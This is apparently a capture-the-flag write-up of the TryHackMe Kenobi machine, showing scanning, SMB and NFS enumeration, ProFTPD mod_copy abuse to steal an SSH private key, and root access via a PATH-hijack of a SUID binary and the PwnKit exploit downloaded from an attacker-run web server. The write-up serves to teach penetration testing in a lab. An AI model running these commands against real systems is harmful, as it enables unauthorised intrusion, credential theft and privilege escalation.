---
author: "fireblood"
date: 2023-05-23
linktitle: Kenobi
menu:
  main:
    parent: tryhackme

title: Kenobi
weight: 998
tags:
    - ProFTPD
    - Privilege Escalation
categories:
    - TryHackMe
---

> Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation.

https://tryhackme.com/r/room/kenobi

<!--more-->

# Scanning

First we will deploy the machine and scan the target using rustscan.

```python
❯ rustscan -a 10.10.112.104 -- -sVC | lolcat
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
0day was here ♥

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.112.104:21
Open 10.10.112.104:22
Open 10.10.112.104:80
Open 10.10.112.104:111
Open 10.10.112.104:139
Open 10.10.112.104:445
Open 10.10.112.104:2049
Open 10.10.112.104:39105
Open 10.10.112.104:44337
Open 10.10.112.104:51941
Open 10.10.112.104:56481
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sVC" on ip 10.10.112.104
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-24 19:45 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:45
Completed NSE at 19:45, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:45
Completed NSE at 19:45, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:45
Completed NSE at 19:45, 0.00s elapsed
Initiating Ping Scan at 19:45
Scanning 10.10.112.104 [4 ports]
Completed Ping Scan at 19:45, 0.15s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:45
Completed Parallel DNS resolution of 1 host. at 19:45, 0.04s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 19:45
Scanning 10.10.112.104 [11 ports]
Discovered open port 22/tcp on 10.10.112.104
Discovered open port 139/tcp on 10.10.112.104
Discovered open port 80/tcp on 10.10.112.104
Discovered open port 21/tcp on 10.10.112.104
Discovered open port 56481/tcp on 10.10.112.104
Discovered open port 445/tcp on 10.10.112.104
Discovered open port 39105/tcp on 10.10.112.104
Discovered open port 111/tcp on 10.10.112.104
Discovered open port 44337/tcp on 10.10.112.104
Discovered open port 2049/tcp on 10.10.112.104
Discovered open port 51941/tcp on 10.10.112.104
Completed SYN Stealth Scan at 19:45, 0.27s elapsed (11 total ports)
Initiating Service scan at 19:45
Scanning 11 services on 10.10.112.104
Completed Service scan at 19:46, 12.08s elapsed (11 services on 1 host)
NSE: Script scanning 10.10.112.104.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:46
Completed NSE at 19:46, 3.95s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:46
Completed NSE at 19:46, 0.99s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:46
Completed NSE at 19:46, 0.00s elapsed
Nmap scan report for 10.10.112.104
Host is up, received timestamp-reply ttl 61 (0.12s latency).
Scanned at 2024-05-24 19:45:50 EDT for 18s

PORT      STATE SERVICE     REASON         VERSION
21/tcp    open  ftp         syn-ack ttl 61 ProFTPD 1.3.5
22/tcp    open  ssh         syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3ad834149e95d168d3b0f057be2c0ae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8m00IxH/X5gfu6Cryqi5Ti2TKUSpqgmhreJsfLL8uBJrGAKQApxZ0lq2rKplqVMs+xwlGTuHNZBVeURqvOe9MmkMUOh4ZIXZJ9KNaBoJb27fXIvsS6sgPxSUuaeoWxutGwHHCDUbtqHuMAoSE2Nwl8G+VPc2DbbtSXcpu5c14HUzktDmsnfJo/5TFiRuYR0uqH8oDl6Zy3JSnbYe/QY+AfTpr1q7BDV85b6xP97/1WUTCw54CKUTV25Yc5h615EwQOMPwox94+48JVmgE00T4ARC3l6YWibqY6a5E8BU+fksse35fFCwJhJEk6xplDkeauKklmVqeMysMWdiAQtDj                                                                                                                                                                                   
|   256 f8277d642997e6f865546522f7c81d8a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBpJvoJrIaQeGsbHE9vuz4iUyrUahyfHhN7wq9z3uce9F+Cdeme1O+vIfBkmjQJKWZ3vmezLSebtW3VRxKKH3n8=
|   256 5a06edebb6567e4c01ddeabcbafa3379 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGB22m99Wlybun7o/h9e6Ea/9kHMT0Dz2GqSodFqIWDi
80/tcp    open  http        syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin.html
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
111/tcp   open  rpcbind     syn-ack ttl 61 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      36941/udp   mountd
|   100005  1,2,3      44306/udp6  mountd
|   100005  1,2,3      50675/tcp6  mountd
|   100005  1,2,3      56481/tcp   mountd
|   100021  1,3,4      41673/tcp6  nlockmgr
|   100021  1,3,4      44337/tcp   nlockmgr
|   100021  1,3,4      45479/udp6  nlockmgr
|   100021  1,3,4      59376/udp   nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp   open  netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn syn-ack ttl 61 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp  open  nfs_acl     syn-ack ttl 61 2-3 (RPC #100227)
39105/tcp open  mountd      syn-ack ttl 61 1-3 (RPC #100005)
44337/tcp open  nlockmgr    syn-ack ttl 61 1-4 (RPC #100021)
51941/tcp open  mountd      syn-ack ttl 61 1-3 (RPC #100005)
56481/tcp open  mountd      syn-ack ttl 61 1-3 (RPC #100005)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 56068/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 32401/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 8514/udp): CLEAN (Failed to receive data)
|   Check 4 (port 35266/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
| nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| Names:
|   KENOBI<00>           Flags: <unique><active>
|   KENOBI<03>           Flags: <unique><active>
|   KENOBI<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   0000000000000000000000000000000000
|   0000000000000000000000000000000000
|_  0000000000000000000000000000
| smb2-time: 
|   date: 2024-05-24T23:46:04
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2024-05-24T18:46:04-05:00
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:46
Completed NSE at 19:46, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:46
Completed NSE at 19:46, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:46
Completed NSE at 19:46, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.86 seconds
           Raw packets sent: 15 (636B) | Rcvd: 12 (524B)
```

# Enumeration

We can see that there is Samba file server running, so let's find the available shares.

```python
❯ smbclient -L 10.10.112.104
Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      
        IPC$            IPC       IPC Service (kenobi server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            KENOBI
root@kali ~/tryhackme 6s ❯
```

We will now try to connect to the anonymous share.

```python
❯ smbclient \\\\10.10.112.104\\anonymous
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep  4 06:49:09 2019
  ..                                  D        0  Wed Sep  4 06:56:07 2019
  log.txt                             N    12237  Wed Sep  4 06:49:09 2019

                9204224 blocks of size 1024. 6876708 blocks available
smb: \> get log.txt
getting file \log.txt of size 12237 as log.txt (25.4 KiloBytes/sec) (average 25.2 KiloBytes/sec)
smb: \> 
```
When we read the log.txt file, we can see the user is kenobi, the id_rsa file path and the ftp running on port 21.

```python
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kenobi/.ssh/id_rsa): 
Created directory '/home/kenobi/.ssh'.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kenobi/.ssh/id_rsa.
Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi
The key's randomart image is:
+---[RSA 2048]----+
|                 |
|           ..    |
|        . o. .   |
|       ..=o +.   |
|      . So.o++o. |
|  o ...+oo.Bo*o  |
| o o ..o.o+.@oo  |
|  . . . E .O+= . |
|     . .   oBo.  |
+----[SHA256]-----+

# This is a basic ProFTPD configuration file (rename it to 
# 'proftpd.conf' for actual use.  It establishes a single server
# and a single anonymous login.  It assumes that you have a user/group
# "nobody" and "ftp" for normal operation and anon.

ServerName			"ProFTPD Default Installation"
ServerType			standalone
DefaultServer			on

# Port 21 is the standard FTP port.
Port				21
```

On the port 111 we see there is rpcbind service running and in the rpcinfo we can see that nfs service is running. So, let's enumerate for nfs shares and from the mount information we can see the mount /var.

```shell
nmap -p 111 -script=nfs-ls,nfs-statfs,nfs-showmount 10.10.112.104
```

```python
❯ nmap -p 111 -script=nfs-ls,nfs-statfs,nfs-showmount 10.10.112.104
Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-25 00:53 EDT
Nmap scan report for 10.10.112.104
Host is up (0.12s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *
| nfs-ls: Volume /var
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
| rwxr-xr-x   0    0    4096  2019-09-04T12:27:33  ..
| rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups
| rwxr-xr-x   0    0    4096  2019-09-04T10:37:44  cache
| rwxrwxrwt   0    0    4096  2019-09-04T08:43:56  crash
| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
| rwxrwxr-x   0    108  4096  2019-09-04T10:37:44  log
| rwxr-xr-x   0    0    4096  2019-01-29T23:27:41  snap
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
|_
| nfs-statfs: 
|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
|_  /var        9204224.0  1737356.0  6976272.0  20%   16.0T        32000

Nmap done: 1 IP address (1 host up) scanned in 2.11 seconds
```

We saw there is a ftp service running on port 21. We found that the ftp version is 1.3.5.

We will use searchsploit to find for any vulnerabilities present in the 1.3.5 version of ProFTPd.

```shell
searchsploit proftpd 1.3.5
```

While looking for the vulnerabilities for the proftpd version 1.3.5, we found that there is a vulnerability that exploits SITE CPFR/CPTO commands.

```python
❯ searchsploit proftpd 1.3.5
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                                                                                | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                                                                                      | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                                                                                                  | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                                                                                                                                | linux/remote/36742.txt
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

# Exploitation

Using this we can copy files in the target. So, we will copy the id_rsa file to the /var directory and then mount the /var directory to our machine.

Let's connect to ftp and copy the files.

```shell
nc 10.10.112.104 21
```

```shell
SITE CPFR /home/kenobi/.ssh/id_rsa
```

```shell
SITE CPTO /var/tmp/id_rsa
```

> http://www.proftpd.org/docs/contrib/mod_copy.html

```python
SITE CPFR
This SITE command specifies the source file/directory to use for copying from one place to another directly on the server.
The syntax for SITE CPFR is:

  SITE CPFR source-path

SITE CPTO
This SITE command specifies the destination file/directory to use for copying from one place to another directly on the server.
The syntax for SITE CPTO is:

  SITE CPTO destination-path 
A client wishing to copy a file/directory first sends a SITE CPFR command, then a SITE CPTO; this is similar to how renames are handled using RNFR and RNTO.

Use of these SITE command can be controlled via <Limit> sections, e.g.:

  <Limit SITE_COPY>
    AllowUser alex
    DenyAll
  </Limit>
```

```python
❯ nc 10.10.112.104 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.112.104]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

Now we will mount the /var directory to our machine.

```shell
mkdir /mnt/kenobi
```

```shell
mount 10.10.112.104:/var /mnt/kenobi
```

```shell
cd /mnt/kenobi
```

```python
❯ mkdir /mnt/kenobi
❯ mount 10.10.112.104:/var /mnt/kenobi
❯ cd /mnt/kenobi
❯ ls -la
total 56
drwxr-xr-x 14 root root  4096 Sep  4  2019 .
drwxr-xr-x  4 root root  4096 May 25 01:01 ..
drwxr-xr-x  2 root root  4096 Sep  4  2019 backups
drwxr-xr-x  9 root root  4096 Sep  4  2019 cache
drwxrwxrwt  2 root root  4096 Sep  4  2019 crash
drwxr-xr-x 40 root root  4096 Sep  4  2019 lib
drwxrwsr-x  2 root staff 4096 Apr 12  2016 local
lrwxrwxrwx  1 root root     9 Sep  4  2019 lock -> /run/lock
drwxrwxr-x 10 root tss   4096 Sep  4  2019 log
drwxrwsr-x  2 root mail  4096 Feb 26  2019 mail
drwxr-xr-x  2 root root  4096 Feb 26  2019 opt
lrwxrwxrwx  1 root root     4 Sep  4  2019 run -> /run
drwxr-xr-x  2 root root  4096 Jan 29  2019 snap
drwxr-xr-x  5 root root  4096 Sep  4  2019 spool
drwxrwxrwt  6 root root  4096 May 25 01:00 tmp
drwxr-xr-x  3 root root  4096 Sep  4  2019 www
❯ cd tmp/
❯ ls -la
total 28
drwxrwxrwt  6 root root 4096 May 25 01:00 .
drwxr-xr-x 14 root root 4096 Sep  4  2019 ..
-rw-r--r--  1 kali kali 1675 May 25 01:00 id_rsa
drwx------  3 root root 4096 May 25 00:43 systemd-private-1e920d8729fd40e9bedb6b724b8b7e62-systemd-timesyncd.service-HJEhTc
drwx------  3 root root 4096 Sep  4  2019 systemd-private-2408059707bc41329243d2fc9e613f1e-systemd-timesyncd.service-a5PktM
drwx------  3 root root 4096 Sep  4  2019 systemd-private-6f4acd341c0b40569c92cee906c3edc9-systemd-timesyncd.service-z5o4Aw
drwx------  3 root root 4096 Sep  4  2019 systemd-private-e69bbb0653ce4ee3bd9ae0d93d2a5806-systemd-timesyncd.service-zObUdn
root@kali /mnt/kenobi/tmp ❯ 
```

We can see the file, we will copy it to our machine and change the permissions for the file. Now ssh into the target as user kenobi.

```shell
chmod 600 id_rsa
```
```shell
ssh kenobi@10.10.112.104 -i id rsa
```

```python
❯ ssh kenobi@10.10.112.104 -i id_rsa
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.


Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$
kenobi@kenobi:~$ id
uid=1000(kenobi) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
```

We're logged in as kenobi.

# Privilege Escalation

## Approach 1

We will find the files with SUID bit set.

```shell
find / -perm -u=s -type f 2>/dev/null
```

```python
kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
```

/usr/bin/menu seems to be unusual among the list of file that we got.

When we execute that binary, we can see a couple of commands that can be executed. We will now manipulate the PATH variable to get our root shell.

```python
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
HTTP/1.1 200 OK
Date: Sat, 25 May 2024 05:09:29 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT
ETag: "c8-591b6884b6ed2"
Accept-Ranges: bytes
Content-Length: 200
Vary: Accept-Encoding
Content-Type: text/html
```

When we used the first command to test what that does, we can see it is using curl to run the status check. Now, we will replace the functionality of the curl command in the status check with the /bin/sh and add it to the path so that we can get the shell as soon it gets executed.

```python
kenobi@kenobi:~$ cd /tmp/
kenobi@kenobi:/tmp$ echo /bin/sh > curl
kenobi@kenobi:/tmp$ chmod 777 curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
#
```

We are root!!!

## Approach 2

Start the python http server and download linpeas.sh to the target machine.

```shell
python -m http.server 1111
```
<img src="{{'/assets/img/images/03.Kenobi/18.png' | prepend: site.baseurl }}" height="200">

> On target machine

```shell
wet http: //10.6.29.149:1111/linpeas.sh
```

Change the file permissions to executable and run the file.

```shell
chmod +x linpeas.sh
```
```shell
./linpeas.sh
```

```python
kenobi@kenobi:/tmp$ wget http://10.6.10.164/linpeas.sh
--2024-05-25 00:13:03--  http://10.6.10.164/linpeas.sh
Connecting to 10.6.10.164:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 847825 (828K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                                     100%[===================================================================================================>] 827.95K  1.13MB/s    in 0.7s    

2024-05-25 00:13:04 (1.13 MB/s) - ‘linpeas.sh’ saved [847825/847825]

kenobi@kenobi:/tmp$ chmod +x linpeas.sh 
kenobi@kenobi:/tmp$ ./linpeas.sh 


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |
    |---------------------------------------------------------------------------------|
    |         Get the latest version    :     https://github.com/sponsors/carlospolop |
    |         Follow on Twitter         :     @hacktricks_live                        |
    |         Respect on HTB            :     SirBroccoli                             |
    |---------------------------------------------------------------------------------|
    |                                 Thank you!                                      |
    \---------------------------------------------------------------------------------/
          linpeas-ng by carlospolop
```

We can see that the target machine is vulnerable to `CVE-2021-4034`.

```python
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
```

We clone the repository to our machine.

> https://github.com/ryaagard/CVE-2021-4034.git

Start the python server again to server the files.

```shell
python -m http.server 1111
```

On target machine create a folder and download all the files to the machine.

```python
kenobi@kenobi:/tmp$ mkdir exploit
kenobi@kenobi:/tmp$ cd exploit/
kenobi@kenobi:/tmp/exploit$ wget http://10.6.10.164/evil-so.c
--2024-05-25 00:28:30--  http://10.6.10.164/evil-so.c
Connecting to 10.6.10.164:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 183 [text/x-csrc]
Saving to: ‘evil-so.c’

evil-so.c                                      100%[===================================================================================================>]     183  --.-KB/s    in 0s      

2024-05-25 00:28:30 (47.8 MB/s) - ‘evil-so.c’ saved [183/183]

kenobi@kenobi:/tmp/exploit$ wget http://10.6.10.164/exploit.c
--2024-05-25 00:28:46--  http://10.6.10.164/exploit.c
Connecting to 10.6.10.164:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 614 [text/x-csrc]
Saving to: ‘exploit.c’

exploit.c                                      100%[===================================================================================================>]     614  --.-KB/s    in 0s      

2024-05-25 00:28:47 (139 MB/s) - ‘exploit.c’ saved [614/614]

kenobi@kenobi:/tmp/exploit$ wget http://10.6.10.164/Makefile
--2024-05-25 00:29:03--  http://10.6.10.164/Makefile
Connecting to 10.6.10.164:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 148 [application/octet-stream]
Saving to: ‘Makefile’

Makefile                                       100%[===================================================================================================>]     148  --.-KB/s    in 0s      

2024-05-25 00:29:04 (31.5 MB/s) - ‘Makefile’ saved [148/148]
```

Run the make file.

```python
kenobi@kenobi:/tmp/exploit$ make
gcc -shared -o evil.so -fPIC evil-so.c
evil-so.c: In function ‘gconv_init’:
evil-so.c:10:5: warning: implicit declaration of function ‘setgroups’ [-Wimplicit-function-declaration]
     setgroups(0);
     ^
evil-so.c:12:5: warning: null argument where non-null required (argument 2) [-Wnonnull]
     execve("/bin/sh", NULL, NULL);
     ^
gcc exploit.c -o exploit
exploit.c: In function ‘main’:
exploit.c:25:5: warning: implicit declaration of function ‘execve’ [-Wimplicit-function-declaration]
     execve(BIN, argv, envp);
     ^
```

Execute the binary.

```python
kenobi@kenobi:/tmp/exploit$ ls
evil.so  evil-so.c  exploit  exploit.c  Makefile
kenobi@kenobi:/tmp/exploit$ ./e
-bash: ./e: No such file or directory
kenobi@kenobi:/tmp/exploit$ ./exploit 
# id
uid=0(root) gid=0(root) groups=0(root)
```

We are root!!!